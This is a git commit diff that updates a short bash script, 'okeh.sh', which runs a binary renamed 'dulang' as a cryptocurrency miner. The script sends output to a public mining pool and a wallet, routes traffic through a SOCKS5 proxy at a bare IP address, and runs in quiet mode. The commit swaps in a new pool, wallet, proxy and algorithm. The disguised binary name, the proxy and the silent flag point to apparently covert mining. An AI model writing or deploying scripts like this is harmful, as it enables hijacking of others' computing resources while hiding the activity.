3eba7e6f5fb86bebca35063af54c3f0eba348a6a
dsfdsftretrtret43433 <86481729+dsfdsftretrtret43433@users.noreply.github.com>
2021-06-26 13:55:56 +0700

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
-WALLET=sugar1qsv26cl69kpgwujwmdhdl468ljm5ypr6kewh0gu.JOHAN
-PROXY=socks5://192.111.139.162:4145
-./dulang -a yespowersugar -o $POOL -u $WALLET -x $PROXY -q
+POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
+WALLET=CUR146RLHFpK1icXKNGWSYHcyVK391daok
+PROXY=socks5://72.49.49.11:31034
+./dulang -a cpupower -o $POOL -u $WALLET -p c=CPU,zap=CPU -x $PROXY -q
